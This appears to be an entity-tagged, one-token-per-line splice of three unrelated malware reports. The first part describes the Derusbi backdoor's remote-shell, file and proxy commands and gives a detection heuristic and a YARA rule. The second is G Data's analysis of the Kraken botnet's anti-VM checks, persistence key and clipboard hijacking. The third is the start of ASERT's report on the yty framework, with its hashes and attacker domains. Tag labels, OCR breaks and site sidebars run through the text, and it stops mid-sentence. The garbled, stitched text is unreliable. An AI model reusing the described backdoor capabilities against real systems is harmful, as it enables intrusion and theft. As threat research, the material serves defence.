pkt
)
data
to
PCC_CMD::ProcessPacketEx
while
ignoring
the
dwPktSize
parameter
.

The
packet's
payload
data
is
,
in
and
of
itself
,
another
datagram
with
a
header
and
optional
payload
section
.

The
payload
of
each
PCC_CMD
destined
packet
contains
the
following
header
:
struct
PCCCMDPacketHeader

DWORD
dwPacketSize;

DWORD
field_4;
//
purpose
unknown
,
seemingly
unused
.

DWORD
dwCommandType;

DWORD
dwLastError;

The
dwCommandType
field
specifies
the
specific
PCC_CMD
command
that
the
client
is
requesting
the
server
variant
perform
.

There
are
four
commands
that
PCC_CMD
supports
:
dwCommandType
0x04
0x08
0x0C
0x10

Functionality

Activate
the
remote
shell

Execute
the
specified
file

Send
input
to
remote
shell

Terminate
the
remote
shell

For
each
of
the
commands
,
any
output
from
or
acknowledgement
of
the
commands
comes
in
the
form
of
another
packet
consisting
of
a
PacketHeader
followed
by
a

PCCCMDPacketHeader
and
any
optional
payload
data
.

The
dwCommandType
of
the
newly
constructed
packet
matches
the
command's
original
dwCommandType
value
(
e.g.
responses
from
0x04
commands
will
reply
with
dwCommandType
set
to
0x04
)
.

PCC_CMD::ProcessPacketEx
will
queue
the
response
packets
in
an
internal
buffer
.

The
PCC_CMD::ReadWaitingData
member
function
is
responsible
for
transmitting
any
of
the
previously
queued
packets
from
PCC_CMD::ProcessPacketEx
.

If
there
are
no
queued
packets
,
PCC_CMD::ReadWaitingData
will
perform
a
queue
of
the
console
output
pipe
for
the
remote
shell
process
(
if
it
is
active);
the
function
will
also
attempt
to
read
the
entirety
of
the
waiting
data
,
which
then
becomes
the
payload
of
a
PacketHeader/PCCCMDPacketHeader
based
packet
with
the
dwCommandType
set
to
0x0C
.

If
the
read
is
unsuccessful
,
the
function
returns
a
PacketHeader/PCCCMDPacketHeader
based
packet
with
the
dwCommandType
set
to
0x10
indicating
an
error
and
terminating
the
remote
shell
session
.

PCC_FILE

The
PCC_FILE
object
provides
a
large
range
of
file
system
administration
functions
.

PCC_FILE
is
derived
from
the
PCC_BASEMOD
class
meaning
that
the
processing
of
commands
should
be
contained
within
the
PCC_FILE::ProcessPacket
member
function
with
some
additional
processing
done
in
the
PCC_FILE::ReadWaitingData
member
function
.

This
is
not
necessarily
the
case
,
however
.

The
PCC_FILE::ProcessPacket
member
function
,
much
like
PCC_CMD::ProcessPacket
,
is
little
more
than
a
stub
function
that
passes
only
a
copy
of
the
payload
data
(
pkt
)
to

PCC_FILE::ProcessPacketEx
.
PCC_FILE::ProcessPacketEx
performs
no
file
management
operations
but
instead
adds
any
incoming
command
packets
to
a
queue
for
processing
by
PCC_FILE::ReadWaitingData
if
the
packet
is
not
already
within
the
queue
(
thus
avoiding
duplication
of
commands
)
.

The
PCC_FILE::ReadWaitingData
member
function
is
a
stub
function
that
calls

PCC_FILE::ProcessQueue
and
returns
the
resulting
packet
from
the
queue
processing
.

This
means
that
file
operations
are
surprisingly
low
priority
,
and
potentially
,
high
latency
operations
.

Each
packet
that
arrives
within
the
packet
queue
of
PCC_FILE
contains
a
standard
header
followed
by
a
(
quasi-optional
)
payload
data
blob
.

The
header
for
the
PCC_FILE
command
packets
takes
the
following
form
:
struct
PCCFilePacketHeader

DWORD
dwTotalPayloadSize;

DWORD
dwCommandType;

The
dwCommandType
field
specifies
the
specific
PCC_FILE
command
that
the
client
is
requesting
the
server
variant
to
perform
.

PCC_FILE
supports
17
(
of
which
15
are
unique
)
commands
.

While
the
general
form
within
the
Derusbi B_malware.backdoor
server
variant
communication
model
is
to
return
a
packet
with
the
same
dwCommandType
as
the
original
command
,
many
of
the

PCC_FILE
commands
return
a
status
packet
type
(
dwCommandType
=
0x04
)
.
dwCommandType
Functionality
0x0C
0x10
0x14
0x18
0x1C
0x20
0x24
0x28
0x2C
0x30
0x34
0x38
0x3C
0x40
0x44
0x48
0x4C

Purge
PCC_FILE
Commands
from
Queue

Based
on
dwCommandType

Enumerate
Attached
Drives

Get
File
Attributes

File
Search

Rename
File

Delete
File

Create
Directory

Upload
File
to
Client

Recursively
Enumerate
Directory

Download
File
from
Client

Copy
File

Move
File

Duplicate
File
Timestamp

Execute
File

Recursively
Enumerate
Directory

Recursively
Enumerate
Directory

Enumerate
All
Drives
and
Files

Response
dwCommandType
(
no
response
)
0x10
0x14
0x18
0x04
0x04
0x04
0x28
and
0x04
0x2C
0x04
0x04
0x04
0x04
0x04
0x44
0x48
0x4C

Commands
0x2C
,
0x44
,
and
0x48
all
appear
to
be
the
exact
same
base
command
with
only
slight
variations
in
their
response
format
.

It
is
unclear
why
this
particular
command
is
included
three
times
in
PCC_FILE
.

PCC_PROXY

The
PCC_PROXY
object
provides
the
platform
for
a
tunneling
network
traffic
to
and
from
the
client
to
a
specific
endpoint
(
or
endpoints
if
multiple
tunnels
are
activated
by
the
client
)
.

Derived
on
the
PCC_BASEMOD
class
,
the
PCC_PROXY
class
performs
very
little
network
tunneling
within
the
CommLoop
interactive
PCC_PROXY::ProcessPacket
and

PCC_PROXY::ReadWaitingData
member
functions
.

The
PCC_PROXY::ProcessPacket
member
function
queues
incoming
PCC_PROXY
packets
into
a
received
queue
while

PCC_PROXY::ReadWaitingData
returns
packets
from
a
transmit
queue
,
with
the
directionality
from
the
perspective
of
the
server
variant
.

The
core
of
the
PCC_PROXY's
network
tunneling
comes
from
a
spawned
processing
thread
(
PCC_PROXY::MainThread
)
that
is
generated
when
the
PCC_PROXY
object
is
instantiated
.

The
PCC_PROXY::MainThread
function
consist
an
infinite
loop
that
only
terminates
when
the

PCC_PROXY::fShutdown
flag
is
set
.

Otherwise
,
the
loop
will
inspect
another
internal
flag
(
PCC_PROXY::fNetworkEnabled
)
to
determine
if
the
network
tunneling
is
currently
active
.

If
the
PCC_PROXY::fNetworkEnabled
flag
is
set
to
false
,
then
tunneling
is
disabled
but
command
processing
continues
.

It
is
possible
to
have
more
than
one
tunnel
active
at
any
given
time
.

In
order
to
firewall
tunnels
from
each
other
over
the
backbone
of
the
server
variant's
command
channel
,
each
tunnel
is
assigned
a
specific
channel
identifier
.

This
allows
the
client
to
specify
which
specific
tunnel
data
is
transmitted
to
as
well
as
telling
the
client
which
tunnel
is
returning
data
.

If
the

PCC_PROXY::fNetworkEnabled
flag
is
set
to
true
,
PRC_PROXY::MainThread
will
loop
through
all
active
channels
,
perform
a
select
on
the
socket
connected
to
the
endpoint
and
--
if
the
select
indicates
that
there
is
data
waiting
on
a
particular
socket
--
the
data
is
read
.

A
new

PCC_PROXY
based
packet
is
then
generated
and
the
packet
is
queued
for
delivery
to
the
client
.

After
processing
each
of
the
channels
for
new
data
,
PCC_PROXY::MainThread
processes
incoming
command
packets
from
the
client
(
an
operation
usually
handled
by
the

PCC_BASEMOD::ProcessPacket
function
)
.

Packets
belonging
to
the
PCC_PROXY
subsystem
have
a
common
header
,
much
like
the
other
PCC_BASEMOD
derived
classes
.

To
this
end
,
the

PCC_PROXY
packets
have
the
same
packet
header
as
the
PCCFilePacketHeader
packet
header
.

The
PCC_PROXY
supports
five
commands
:
dwCommandType
0x04
0x08
0x0C
0x10
0x14

Functionality

Connect
to
Specified
Endpoint
(
Creates
New
Channel
)

Send
Data
to
Endpoint

Terminate
Channel

Enable
Network
Tunneling
(
PCC_PROXY::fNetworkEnabled
set
to
true
)

Disable
Network
Tunneling
(
PCC_PROXY::fNetworkEnabled
set
to
false
)

Administrative
Commands

The
administrative
commands
are
built-in
to
the
server
variant
and
are
not
derived
from
the

PCC_BASEMOD
class
.

Each
of
the
administrative
command
packets
contains
the
same
header
structure
as
the
PCCFilePacketHeader
structure
followed
by
an
optional
payload
data
blob
.

The
administrative
commands
consist
of
the
following
five
commands
:
dwCommandType
0x08
0x10

Functionality

Terminate
the
current
network
connection
between
the
client
and
the
server
variant
.

Run
the
Cleanup
member
function
of
each
of
the
registered

PCC_BASEMOD
derived
objects
,
effectively
resetting
the
state
of
each
of
the
modules
.

Write
infection
ID
to
the
registry
and
immediately
terminate
the
server
variant
.

Shutdown
the
server
variant
(
set
fShutdown
to
true
)

Drop
a
new
DLL
to
%TEMP%\tmp1.dat
,
load
the
DLL
into
memory
and
call
DllRegisterServer
to
install
a
new
server
variant
binary
on
the
victim's
system
.

0x14
0x18
0x1C

Detection

Given
the
encrypted
,
and
potentially
compressed
,
nature
of
Derusbi B_malware.backdoor
server
variant
network
traffic
,
detecting
the
traffic
on
a
network
can
be
problematic
using
traditional
IDS
signatures
.

Using
a
heuristic
approach
,
it
would
be
possible
to
detect
the
handshake
of
a
possible
Derusbi B_malware.backdoor
server
variant
session
by
looking
for
the
following
pattern
:

Client

Exactly
64
bytes
transmitted

First
8
bytes
taking
the
pattern
of
0x28
0x00
0x00
0x00
0x02
0x00
0x00
0x00

Server

Exactly
64
bytes
transmitted

Detecting
Derusbi B_malware.backdoor
server
variants
on
disk
is
possible
using
the
following
YARA
signature
:
rule
Derusbi_Server  B_malware.backdoor
$uuid
=
'
{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}
'
wide
ascii
$infectionID1
=
'
-%s-%03d
'
$infectionID2
=
'
-%03d
'
$other
=
'
ZwLoadDriver
'
$uuid
or
(
$infectionID1
and
$infectionID2
and
$other
)
strings
:
condition
:
2015-05-08
,
8:46
AM

G
Data
International

G
Data
Germany

RSS
Feed
back
07.05.2015
,

Author
:
Paul
Rascagnères

Dissecting
the
'
Kraken  B_malware.ransom
'

Analysis
of
the
Kraken  B_malware.ransom
malware
that
was
used
for
a
targeted
attack
in

In
January
2015
,
unidentified
attackers
attempted
to
infiltrate
a
multi-national
enterprise
based
in
the
United
Arab
Emirates
,
using
a
spear
phishing
attack
with
a
crafted
MS
Word
document
attached
to
the
message
.

Once
it
has
reached
its
target
,
the
payload
used
was
designed
to
work
as
an
information
stealer
and
reconnaissance
tool
.

G
DATA's
security
experts
identified
the
malware
behind
this
attack
and
reveal
information
about
the
actual
power
of
the
malware's
tentacles
.

Search

Recent
entries
:
10.04.2015
:
Staying
alert
when
buying
banners
:
Google's
advertising
service
misused
for
distributing
malware
31.03.2015
:
IoT
:
The
Internet
of
Things
...
ehm
...
Trouble
?
!
16.03.2015
:
The
Andromeda/Gamarue
botnet B_malware.ransom
is
on
the
rise
again
06.03.2015
:
Casper
:
the
newest
member
of
the
cartoon
malware
family
22.02.2015
:
The
power
of
trust
:
'
Superfish
'
case
turns
into
a
worst
case
scenario

Category

Adware

Bots
&
Botnets B_malware.ransom

CyberCrime
eCrime
economy

Legal
issues

Exploits

Funny
findings

Web
threats

Scareware

Phishing

Security
products

Vulnerabilities

Social
engineering

Mails

Mobile

Mobile

Social
Network

Tags

In
this
article
,
the
G
DATA
SecurityLabs
will
have
a
look
at
the
following
topics
:
an
example
of
the
spear
phishing
campaign
,
sent
only
a
few
days
after
the
malware
has
been
advertised
the
marketing
approach
to
sell
the
malware
the
analysis
of
some
of
Kraken's  B_malware.ransom
features
theories
about
why
Kraken  B_malware.ransom
has
been
used
as
malware
in
a
targeted
attack

Infection
Vector

The
attacker(s
)
sent
a
specially
crafted
email
to
at
least
one
employee
of
the
attacked
enterprise
.

The
email's
body
reveals
a
business-related
topic
:
an
offer
to
become
member
of
this
year's
International
Trade
Council
.

Nevertheless
,
the
offer
is
directed
at
the
Philippine

National
Bank
,
not
the
enterprise
actually
receiving
the
email
.

This
could
be
a
trick
to
make
the
recipient
even
more
curious
to
look
at
the
attached
document
,
because
he/she
received
documents
not
issued
for
him/her
.

The
G
DATA
experts
alerted
the
aeCERT
about
the
incident
and
their
analysis
results
.

1337
crew
adware
aldi
amtso
analysis
android
android
market
apple
apt
authentication
autorun
av
products
award
badusb
banking
blog
bot
botnet B_malware.ransom
bredolab
browser
brwoser
bug
carbon
caro
casino
cebit
cellphone
chat
cloud
cms
cobra
coding
conference
credit
card
cve
cyber
espionage
cyber
espionage;
malware
cyper
espionage
.

targattacks
dll
dns
domain
eicar
email
exploit
positive
fraud
fifa
flash
ftp
gaming
google
google
iframe
java
khobe
play
hack
heartbleed
infection
likejacking
injection
link
lizamoon
lottery
mac
mail
mails
links
exploits
eyjafjallajoekull
fake
fake
alert
firefox
facebook
false
fake
av
flame

malware
malware
windows
matousec
microsoft
microsoft
windows
mobile
network
news
osama
bin
laden
password
pdf
pharmacy
phishing
picture
pinterest
playstation
poker
pos
privacy
pup
ransom
riskware
removal
instructions
rsa
scan
scareware
shopping
short
url
snowden
socail
engineering
soccer
social
engineering
social
network
spain
spam
spyeye
sql
stuxnet
targattacks
trojan  B_malware.backdoor
uefa
uefa
euro
2012
underground
update
url
uroburos  B_malware.backdoor
usb
virus
testing
tool
bulletin
vulnerabilities
warning
wifi
windows
windows
8
wordpress
worm
youtube
zero
day
zeus
zynga
404

In
this
case
,
the
attachment
is
a
Microsoft
Word
document
which
tries
to
exploit
the
vulnerability
described
in
CVE-2012-0158
in
order
to
drop
and
execute
malware
dubbed
'
Kraken  B_malware.ransom
HTTP  I
'
.

The
G
DATA
security
solutions
detect
the
malicious
document
(
08E834B6D4123F0AEA27D042FCEAF992  B_hash
)
as
Exploit.CVE-2012-0158.AH
and
G
DATA's
proactive
Exploit
Protection
technology
also
prevents
the
attack
before
the
PC
can
be
infected
.

The
Malware
,
advertised
on
the
Underground
Market
'
Kraken  B_malware.ransom
HTTP  I
'
is
sold
on
at
least
one
underground
market
as
a
commercial
product
.

Someone
,
who
claims
not
to
be
the
author
of
the
malware
,
promoted
the
malware
with
a
kind
of
banner
which
has
quite
a
visual
impact
.

Have
a
look
at
the
'
ad
'
that
was
published
back
in
December
2014
.

The
banner
describes
the
botnet B_malware.ransom
:
its
technical
features
the
available
commands
(
classic
ones
,
such
as
visiting
a
website
using
the
infected
bot
,
download
and
execute
a
command
or
a
library
,
update
and
uninstall
)
the
plugins
one
can
use
:
file
stealer
,
ad-clicker
,
form
grabber
,
...

The
command
'
visiting
a
website
'
using
the
infected
bot
could
be
used
by
the
attackers
as
an
entry
point
for
blackmailing
the
infected
user
.

The
attackers
could
visit
websites
that
are
regarded
as
illegal
in
the
respective
country
and
could
then
ask
for
ransom
and
threaten
to
release
information
about
the
alleged
violation
to
any
seemingly
official
entity
who
would
then
investigate
against
the
victim
.

The
flyer
also
reveals
the
price
of
the
malware
:
The
basic
binary
costs
$320
and
each
plugin
must
be
paid
for
separately
,
for
example
$50
for
the
file
stealer
,
$60
for
the
ad-clicker
and
up
to
$350
for
a
configurable
form
grabber
.
Accepted
payment
methods
are
the
usual
virtual
currencies
and
pre-paid
options
.

A
price
list
found
on
a
different
website
,
also
posted
in
December
2014
,
lists
the
binary's
price
as
$270
and
some
additional
modules
,
such
as
a
'
Edit
Hosts
module
'
(
$15
)
,
a
'
Botkill
module
'
(
$30
)
and
a
'
Bitcoin
monitor
module'($20
)
.

Furthermore
,
'
Kraken  B_malware.ransom
HTTP  I
'
is
advertised
as
'
a
new
,
revolutionary
botnet B_malware.ransom
[...]
and
very
noob-friendly
'
.
Noob
is
a
word
describing
'
that
someone
is
new
to
a
game
,
concept
,
or
idea;
implying
a
lack
of
experience
.
'
But
now
let's
have
a
look
at
what
the
botnet B_malware.ransom
really
is
.

Marketing B_malware.unknown
vs. I
Reality I

After
having
a
glimpse
at
the
ad
designed
to
promote
the
malware
,
we
analyzed
a
sample
of
it
:
3917107778F928A6F65DB34553D5082A  B_hash
,
which
is
detected
as
Gen:Variant.Zusy.118945
.

We
decided
to
analyze
some
features
mentioned
in
the
flyer
and
on
the
other
website
to
evaluate
their
power
and
implementation
.

Feature
:
'
Bypass
UAC
'

As
expected
,
the
malware
does
not
really
bypass
the
UAC
.
It
rather
uses
a
classic
trick
already
used
by
several
malware
instances
.

It
uses
a
legitimate
Microsoft
binary
in
order
to
execute
itself
with
administrator
permissions
.

We
already
presented
this
technique
in
our

G
DATA
SecurityBlog
article
about
the
Beta
Bot
.

Feature
:
'
Anti-VM
'

The
flyer
explains
that
the
botnet B_malware.ransom
won't
work
in
a
virtual
machine
.

To
detect
whether
the
malware
is
running
in
a
virtual
machine
,
the
malware
author
checks
if
the
following
directories
and
the
one
file
exist
:

C:\Program
Files\VMWare\VMware
Tools\

C:\Program
Files
(
x86)\VMware\WMware
Tools\

C:\WINDOWS\system32\VBoxtray.exe

Furthermore
,
the
malware
checks
if
following
applications
analysts
usually
use
are
being
executed
:

Wireshark
:
a
network
analyzer

Fiddler
:
a
web
proxy
used
to
debug
HTTP
flow
.

We
can
see
the
tools
detection
:

If
one
of
the
elements
mentioned
above
is
detected
,
the
malware
will
display
a
rather
poetic
dialog
popup
:

So
,
the
anti-VM
is
really
rudimentary
.

If
the
additional
tools
are
not
installed
on
the
virtual
machine
the
malware
can
be
perfectly
executed
.

Feature
:
'
Folder
,
Bot
file
&
All
file
dropped
are
hidden
'

The
folders
&
bot
files
simply
have
the
'
hidden
'
attribute
set
in
Microsoft
Windows
.

If
you
configure
you
system
to
show
hidden
files
and
directories
,
you
can
perfectly
see
them
:

So
,
the
botnet B_malware.ransom
does
not
use
advanced
techniques
to
hide
itself
.

Feature
:
'
Process
&
registry
persistence
'

The
malware
persistence
uses
a
registry
key
in
order
to
be
executed
automatically
in
case
the
system
is
rebooted
.

The
key
is

HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows
:

The
malware
repeatedly
checks
whether
this
entry
is
removed
.

In
case
the
entry
is
removed
,
the
malware
will
create
a
new
one
.

However
,
instead
of
removing
it
,
we
can
simple
rename
the
path
to
the
executable
in
order
to
switch
off
the
persistence
mechanism
.

So
,
the
malware
does
not
have
any
clever
persistence
features
either
.

Feature
:
'
Path
&
variable
encrypted
'

We
identified
two
kinds
of
'
encrypted
'
data
:

Some
paths
are
encoded
using
base64
algorithm
,
such
as
:
JVdJTkRJUiUA
(
%WINDIR%
)
and
JWFwcGRhdGElaa==
(
%appdata%
)

Some
data
is
encrypted
(
RC4
)
,
such
as
the
C&C
information
:

Feature
:
'
Bitcoin
monitor
plugin
'

The
Bitcoin
monitor
plugin
is
even
more
amusing
.

It
is
not
advertised
on
the
flyer
but
on
the
other
website
we
found
.

The
malware
monitors
the
infected
user's
clipboard
.

If
the
user
copies
a
Bitcoin
address
to
the
clipboard
,
it
will
be
replaced
by
an
address
pre-configured
by
the
botmaster
.

A
Bitcoin
address
is
an
identifier
of
26-35
alphanumeric
characters
which
represent
the
owner
of
a
Bitcoin
wallet
,
for
example
something
like

3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy  B_hash
.

We
can
easily
imagine
that
the
plugin's
'
test
'
is
prone
to
produce
false
positives
,
because
any
alphanumeric
text
copied
by
the
user
will
be
automatically
changed
without
reason
if
it
has
a
length
between
26
and
35
characters
.
Ok
,
we
admit
that
the
German
word
'
Kraftfahrzeughaftpflichtversicherung
'
(
36
)
would
not
be
harmed
when
copied
,
but
what
about
'
Bundesausbildungsfoerderungsgesetz
'
(
34
)
or
'
radioimmunoelectrophoresis
'
(
27
)
?

Just
kidding
.

But
any
string
,
from
strong
passwords
to
bank
account
numbers
and
more
could
be
affected
.

Feature
:
'
Download
&
Execute
'
,
the
next
Step

This
feature
allows
installing
further
malware
on
the
affected
PC
in
case
the
attackers
decide
the
current
machine
is
interesting
enough
.

'
Kraken  B_malware.ransom
HTTP  I
'
is
only
the
first
stage
in
this
attack
and
can
be
seen
as
reconnaissance
tool
.

Administration
Panel

The
experts
of
the
G
DATA
SecurityLabs
had
access
to
the
panel
used
by
'
Kraken  B_malware.ransom
HTTP  I
'
but
the
source
code
is
protected
by
a
commercial
packer
called
IonCube
loader
.

Nevertheless
,
we
can
reveal
some
screenshots
of
the
administration
panel
which
are
available
on
the
underground
.

Note
that
some
of
the
texts
contain
mistakes
:

Conclusion

We
suppose
that
the
Kraken  B_malware.ransom
botnet B_malware.ransom
was
developed
by
a
beginner
.

The
malware
does
not
include
advanced
malware
technologies
and
no
groundbreaking
innovations
,
even
though
those
were
advertised
.
Many
sensitive
strings
are
not
encrypted
,
such
as
installation
paths
,
anti-virus
listings
,
insults
against
the
analysts
and
much
more
.

To
sell
the
botnet B_malware.ransom
malware
,
the
author
used
a
quite
sexy
marketing
flyer
,
but
,
actually
,
the
malware
turned
out
to
be
rather
simple
.
'
Kraken  B_malware.ransom
HTTP  I
'
was
said
to
be
used
during
an
espionage
campaign
against
the
energy
sector
,
especially
against
targets
in
the
UAE
.
We
have
now
identified
a
specific
target
from
this
geographical
region
and
have
obtained
one
of
the
spear
phishing
emails
used
.
Even
though
the
targets
that
are
known
by
now
are
rather
high-level
targets
,
the
malware
code
as
well
as
its
features
is
not
advanced
.

We
are
surprised
to
see
this
piece
of
code
has
been
used
carrying
out
targeted
attacks
rather
than
broader
criminal
activities
.
It
is
not
surprising
that
attackers
use
vulnerabilities
that
are
older
,
because
,
unfortunately
,
many
computers
are
likely
to
be
still
out
of
date
and
so
the
attack
works
.
Despite
the
fact
that
the
vulnerability
used
is
not
a
new
one
,
the
malware
does
not
have
the
common
features
that
we
saw
during
other
targeted
attack
campaigns
.

Compared
to
incidents
like
Uroburos  B_malware.backdoor
,
the
Kraken  B_malware.ransom
malware
is
not
good
enough
to
'
catch
the
big
fish
'
if
we
want
to
stick
with
to
the
metaphor
.

So
,
from
the
current
point
of
view
,
there
are
three
theories
:

The
attackers
who
developed
the
Kraken  B_malware.ransom
malware
might
have
chosen
to
diversify
their
business
and
chose
to
attack
special
interest
targets
themselves
.

The
attackers
identified
infected
machines
in
the
business
sector
and
followed
the
tracks
to
see
what
else
they
might
be
able
to
get
from
the
companies
.

The
actual
espionage
team
voluntary
chose
to
use
a
kind
of
usual
and
rather
simply
botnet B_malware.ransom
malware
in
order
to
distract
analysts
from
seeing
a
deeper
meaning
behind
this
attack
and
make
them
disregard
it
as
'
daily
cybercrime
business
'
.

Attached
Files
:
kraken_illu_4c.jpg1.9
M
kraken_illu_rgb.jpg411
K
kraken_illu_web.jpg153
K
ASERT
team
(
https://www.arbornetworks.com/blog/asert/author/asert-team/ B_url.normal
)
on

March
8
,
2018
.
(
https://www.arbornetworks.com/blog/asert/2018/03/ B_url.normal
)

Authors
:
Dennis
Schwarz
and
Jill
Sopko

Special
thanks
to
Richard
Hummel
and
Hardik
Modi
for
their
contributions
on
this
post
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-newmodular-malware-framework-south-asia/decoy_doc-2/  B_url.normal
)

Figure
1
:
Pakistan
themed
decoy
document

Key
Findings

ASERT
discovered
a
new
modular
malware
framework
,
we
call
yty
,
that
focuses
on
 le
collection
,
screenshots
,
and
keylogging
.

We
believe
the
threat
actors
,
Donot
Team
,
who
created
EHDevel B_malware.infosteal
,
also
created
the
yty
framework
.

With
medium
con dence
,
ASERT
believes
this
new
malware
framework
will
pick
up
where
EHDevel B_malware.infosteal
left
o 
and
continue
to
focus
on
targets
in
South

Asia
.

Overview

In
late
January
2018
,
ASERT
discovered
a
new
modular
malware
framework
we
call
'
yty
'
.

The
framework
shares
a
striking
resemblance
to
the
EHDevel B_malware.infosteal
framework
.

We
believe
with
medium
con dence
that
a
team
we
call
internally
as
'
Donot
Team
'
is
responsible
for
the
new
malware
and
will
resume
targeting
of

South
Asia
.

In
a
likely
e ort
to
disguise
the
malware
and
its
operations
,
the
authors
coded
several
references
into
the
malware
for
football—it
is
unclear
whether
they
mean

American
football
or
soccer
.

The
theme
may
allow
the
network
tra c
to
 y
under
the
radar
.

While
we
believe
this
framework
and
its
components
are
new
,
it
shares
many

Tactics
,
Techniques
,
and
Procedures
(
TTPs
)
and
Indicators
of
Compromise
(
IOCs
)
with
the
EHDevel B_malware.infosteal
malware
framework
.
In
September
2017
,
Bitdefender
released
a
white
paper
(
https://labs.bitdefender.com/2017/09/ehdevel-the-story-of-acontinuously-improving-advanced-threat-creation-toolkit/
)
describing
EHDevel B_malware.infosteal
and
some
of
the
campaigns
that
used
it
.
Some
of
the
highlights
of
it
included
the
following
:

Labeled
as
an
APT B_malware.backdoor
(
advanced
persistent
threat
)
and
active
since
at
least
2016
.

Modular
architecture
with
malware
functionality
spread
over
multiple
components
.

Components
used
a
variety
of
programming
languages
(
C++
,
.NET
,
Python
,

VBS
,
and
AutoIt
)
.

Functionality
included
:
 le
collection
,
screenshots
,
key
logging
,
and
gathering
system
information
.

Command
and
control
(
C2
)
hosts
stored
in
a
document
hosted
on
Google

Docs
.

Decoy
documents
,
timestamp
analysis
,
and
C2
server
log
analysis
showed
a
focus
on
Pakistan
.

We
assess
with
medium
con dence
that
the
yty
framework
is
a
replacement
for
the
EHDevel B_malware.infosteal
framework
and
that
the
Donot
Team
may
start
using
it
in
campaigns
in
a
similar
manner
as
EHDevel B_malware.infosteal
.

The
evolution
from
EHDevel B_malware.infosteal
to
yty
shows
the
threat
actors
are
continually
improving
and
modifying
their
malware
framework
,
adding
to
their
sophistication
.

Campaign
Analysis

Donot
Team
campaigns
use
multiple
methods
to
mimic
legitimate
applications
,
organizations
,
and
services
like
Adobe
,
Gmail
or
news
outlets
.

They
also
including
seemingly
benign
domains
that
likely
raise
minimal
suspicion
to
a
human
observer
.

The
following
domains
are
a
few
examples
:
abodeupdater[.]com

Adobe
update
services
qmails[.]org

Gmail
webmail
service
serviceupports[.]com

Generic
services
domains
sundayobserver[.]net

Mimics
weekly
English-language
newspaper
in
Sri
Lanka
thebangladeshtoday[.]net

English
version
of
the
national
daily
newspaper
in
Bangladesh

The
actors
use
false
personas
to
register
their
domains
instead
of
opting
for
privacy
protection
services
.
Depending
on
the
registrar
service
chosen
,
this
could
be
seen
as
another
cost
control
measure
.
The
actors
often
used
typo-squatting
to
slightly
alter
a
legitimate
domain
name
.
In
contrast
,
the
registration
information
used
accurate
spelling
,
possibly
indicating
the
domain
naming
was
intentional
,
typos
included
.
Each
unique
registrant
usually
registered
only
a
few
domains
,
but
mistakenly
reused
phone
numbers
or
the
registration
data
portrayed
a
similar
pattern
across
domains
.
Looking
at
shared
IP
infrastructure
,
it
was
easy
to
see
the
registration
patterns
and
expand
the
network
used
by
the
attackers
.

The
Donot
Team
relies
heavily
on
subdomains
.
Nearly
every
domain
discovered
through
the
course
of
this
investigation
had
multiple
,
unique
subdomains
and
every
malware
sample
analyzed
communicated
to
subdomains
.
In
at
least
two
instances
,
the
domain
never
resolved
to
an
IP
address
.
Instead
,
the
malware
used
subdomains
,
which
lead
to
active
infrastructure
.

Many
of
the
sub-domains
only
navigated
to
the
third
level
,
but
other
samples
used
overly
complex
subdomain
structures
down
to
the
sixth
or
seventh
level
.
update.<domain>[.]com
service.<domain>[.]org
mail-live.outlook-com.332dhgka93t-veri9fjg3j2s33gl.system.thebangladeshtoday[.]net

Looking
at
registration
patterns
and
passive
DNS
,
many
of
these
domains
resolve
for
as
little
as
three
days
before
going
o ine
.
It
is
possible
the
attackers
use
these
small
windows
to
test
their
malware
operations
.

Although
we
did
not
observe
the
original
distribution
of
the
core
binary
,
we
believe
the
group
speci cally
targeted
Pakistani
individuals
based
on
the
decoy
documents
observed
.
They
appeared
to
be
o cial
Government
of
Pakistan
memos
,
see
Figure
1
,
above
.

Attribution

Donot
Team's
TTPs
,
infrastructure
,
and
the
malware
code
are
strikingly
similar
to
the
EHDevel B_malware.infosteal
malware
reported
by
BitDefender
and
is
likely
the
same
group
of
operators
.

Bitdefender
noted
that
the
EHDevel B_malware.infosteal
malware
appeared
similar
to
malware
analyzed
by
Blue
Coat
Labs
in
their
report
'

Snake
in
the
Grass
(
https://github.com/aptnotes/data/ les/679036/Snake.In.The.Grass.-.Pythonbased.Malware.Used.For.Targeted.Attacks.-.BLUE.COAT.LABS.pdf
)
'
.

The
'
Snake
in
the
Grass
'
report
also
showed
malware
similarities
and
infrastructure
overlap
with
Operation
Hangover
(
also
known
as
the
Patchwork
Group
)
.

While
Arbor
agrees
that
there
are
suspicious
similarities
between
the
Donot
Team
and

Patchwork
,
we
did
not
uncover
de nitive
evidence
to
link
the
two
groups
.

Additionally
,
a
malicious
document
associated
with
yty
was
tagged
(
https://twitter.com/HybridAnalysis/status/968958087712460800  B_url.normal
)
by
Hybrid

Analysis
as
'
Viceroy
Tiger
'
,
but
there
hasn't
been
much
recent
public
information
on
this
group
that
we
could
 nd
to
corroborate
.

yty
Malware
Framework
Analysis

One
of
the
TTPs
associated
with
the
Donot
Team
is
the
use
of
modular/pluginbased
malware
frameworks
.

We
call
the
new
malware
framework
'
yty
'
(
based
on
debugging
strings
in
its
components
)
.

The
components
of
the
framework
are
shown
in
Figure
2
:
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/file_drops/
)

Figure
2
:
yty
malware
components
.

Circular.xls
Analysis

The
 rst
piece
of
the
framework
is
a
malicious
Excel
document
named
'
Cirular.xls
'
(
9ce56e1403469fc74c8 61dde4e83ad72597c66ce07bbae12fa70183687b32d B_hash
)
.

The
content
of
the
spreadsheet
is
an
executable
that
is
extracted
and
executed
by
macros
,
Figure
3
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/macro1/ B_url.normal
)

Figure
3
:
Circular.xls
macro
script

The
delivery
mechanism
for
the
XLS
 le
is
unknown
,
but
evidence
suggests
it
could
be
a
test
document
as
seen
in
Figure
4
:
(
https://www.arbornetworks.com/blog/asert/donotteam-leverages-new-modular-malwareframework-south-asia/metadata/  B_url.normal
)

Figure
4
:
XLS
document
properties
.exe
(
Downloader
1
)
Analysis

SHA256
:
8d7eb0b7251bc4a40ebc9142a59ed8af16fb11cf8168e76dca48a78d6d7e4595  B_hash

Compilation
Date
:
2018-02-05
09:06:13

PDB
Path
:
C:\Users\donot\Documents\Visual
Studio
2010\Projects\downloader\Debug\downloader.pdb

Due
to
a
bug
in
the
macro
code
,
the
extracted
executable
is
saved
as
'
.exe
'
.
This
is
a
stripped
down
C++
program
that
,
as
its
PDB
path
string
